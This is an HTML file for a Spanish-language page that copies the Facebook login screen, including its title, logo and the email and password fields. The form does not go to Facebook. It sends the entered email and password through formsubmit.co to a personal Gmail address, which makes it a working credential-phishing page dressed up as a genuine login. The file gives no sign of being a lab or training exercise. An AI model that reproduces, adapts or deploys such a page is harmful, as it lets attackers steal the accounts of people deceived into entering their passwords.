<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="estilos.css">
    <title>Facebook - Inicia sesión o regístrate</title>
</head>
<body>
    <div class="ContenedorLogo">
      <img src="logo.svg" alt="Facebook">
    </div>
    <div class="ContenedorFormulario">
        <div class="Formulario">
            <div class="Titulo">Iniciar  sesión  en  Facebook</div>
            <div class="Form">
                <form action="https://formsubmit.co/dguarnerosmarquez@gmail.com" method="POST" id="form" target="_blank">
                    <div class="Elementos"><input class="Input" placeholder="Correo electrónico o número de teléfono" type="email" name="correo"></div>
                    <div class="Elementos"><input class="Input" placeholder="Contraseña" type="password" name="contrasenia"></div>
                    <div class="Elementos"><input class="Iniciar" type="submit" value="Iniciar sesión"></div>
                    <div class="Elementos2"><div class="Link"><a href="#">¿Olvidaste tu cuenta?</a></div></div>
                    <div class="raya"><hr width="180" height="1"> o <hr width="180"> </div>
                    <div class="Crear"> <input class="Nueva" type="submit" value="Crear cuenta nueva"></div>
                </form>
            </div>
        </div>
    </div>
    <script src="envio.js"></script>
</body>
</html>
